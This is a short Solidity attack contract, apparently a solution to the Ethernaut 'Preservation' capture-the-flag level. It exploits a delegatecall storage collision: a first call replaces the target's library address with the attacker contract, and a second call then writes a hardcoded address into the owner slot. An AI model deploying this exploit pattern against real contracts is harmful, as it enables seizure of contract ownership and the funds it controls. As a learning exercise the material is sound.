pragma solidity >=0.4.22 <0.9.0;


import './Preservation.sol';

contract ExoSixteen {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
    Preservation preservation;

    constructor(address _target) public{
        preservation = Preservation(_target);
    }

    function execute() public{
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(1);
    }

    function setTime(uint _time) public {
        owner = address(0xf63C073Fb0A9aeb8C708dEe86A6Eb0ac0c7A9886);
    }
    // set the time for timezone 1
    //function setFirstTime(uint _timeStamp) public {
      //  owner = msg.sender;
    //}
}